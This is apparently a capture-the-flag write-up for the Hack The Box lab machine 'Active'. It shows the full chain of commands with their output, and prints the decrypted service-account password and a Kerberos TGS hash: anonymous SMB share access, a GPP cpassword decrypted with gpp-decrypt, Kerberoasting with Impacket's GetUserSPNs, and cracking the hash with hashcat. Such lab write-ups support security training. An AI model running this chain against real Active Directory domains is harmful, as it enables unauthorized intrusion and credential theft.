`sudo nmap -vvv -Pn -sC -sCV --reason -T4 -p0-65535 10.129.12.3`

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-21 15:51:18Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49162/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49166/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49168/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Average windows box. 

We see that SMB is on the server - We list out the shares `smbclient -L 10.129.12.3`

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk
```

We now find that Replication allows for Anonymous login, Luckily for us it look like there are some files in there. 

we find a groups.xml file in `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\` We use the `get` command to bring it over to our local machine. 

We see this 

```
cat Groups.xml  
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```

**cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"**

Sweet. Upon googling `what type of hashes are in groups.xml file windows` we see that we can use gpp-decrypt to decrypt this 

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

We now have the password for the SVC_TGS user lets try to use this to login to the smb share

`smbclient -I //10.129.12.3/Users -U SVC_TG%GPPstillStandingStrong2k18` 



We then find the users file. Now we can use these creds to enumerate users where potential kerberoating attacks are possible, We use the hint and take advantage of https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py - Thought process. Now that I am on this service account where can I look to gain further information. What else can be found from here 

```
python GetUserSPNs.py -request -dc-ip 10.129.12.3 active.htb/SVC_TGS
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-12-21 10:49:18.604160             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d37693029069d4eefe8c5a80e781fdb6$83ada13ca19d973ba026d491922eb8f2dac3d97c1f9bf0b111007f6afcd9a7bd1cabb7c739b0e99d258915120b0261376f11f1197d64b08ea4f3483326e5e44b0037691fbc5049f4ba2e9d3379d14bc6f923b48f2bae452943cc0fb5332cf8934efac9a367fed7d79c6567e808a91cf019c72f9f2e103d381160636ade832b37feffb630df199941ef3141dbb80ecfa1a08db5115f2e1e411024cd420f3ba5fe6f13b18f78e75c72908aadd501953abc13b9945ac89aaa6436c984cfc39de9f0719af6b38fbb8de3f3b8eac6514770ebdbb664878cd533c525336fc87a6b54754abc0d56fd4b64078df6e7186b3417436396ceb36359216e0c67fb6b85ef9dfb2e429ab400c5acb183b0ed870f2d27c5f922ef9c60c1d2876cc13f73502ce6d28e1ef450c644a5b334095d1aee6fd3b88c94ca68aaab4c37aecaa6490c964a9d7484895e087bbf30d4875c7959a16188042a004c5c1f13dd31af6da192b4cd7e4aacdefe9e63b9551939848eee248d34b3499112bc4accd93a5ef57bc16542c32499c8c468876de4051eaacfadca14c4e82dbf6c72bb0b3cedff53759cfb0af3e1b9b014a21375f366c0cbbc6c76ab714ed342a813aa895fe0ce94c8c1107ed6c7f5eb773da998979ce0ce3eed8ff0fc707e6b6880d422853fea53b269512f5bbc95336ca62d50088d6ebcaa9b3936e58ab9a23822910bcb15c7226de9732e4aba8ca66f1061bb3003fc3c7e207809068a594a4287c5588b3984a54e86409453ac15d39ba099ff56b2f1111a8d6fe90932aa8132de9fc43581a1c862e23a2002584f0e17ee7f7e71136ed2a665e9853ee4e66726151c732f77b0363188855521223b17160ddaa0f56b8173f1d9ba867c3d37578cc7bf57c601ad4c6c934ab418a208c1c0916b9ea5e27fc43357770ffe98e9642bbe3dd146c23ea7306ef8c1503e1bf5b4daa2342e0333e844090dcc5affa239f803a9e29b52dd2f260c93a063726635c49fd267c9bf092246c8e2edf852273c9061bcd7344d8b22af079f4d36390734cf43e2079741e0cfffa87819ab00c801366e8c642a3eadadd56d2f37518909f755d0441107613d154ff37d51220f076a6b74bc85c56d890782c23dfba53fa936422821f412ef03810c5e5f2f97099736a759592d0699f9db66d27aae1c06ae1c592eb8431c8fd7fdf0d19076fb4e626a710dbcd08cc52347bcb8f738927725a143c6006d055cced3890c9de76fa0e53661795ad1512dd0
```

https://hashcat.net/wiki/doku.php?id=example_hashes Shows that this hash type in hashcat is 13100 
we use `hashcat -m 13100 -a 0 GetUserSPNs.out  /usr/share/wordlists/rockyou.txt --force` to crack that shit. 

Once we have this password we can connect using the administrator account and shii, We have rooted this windows box

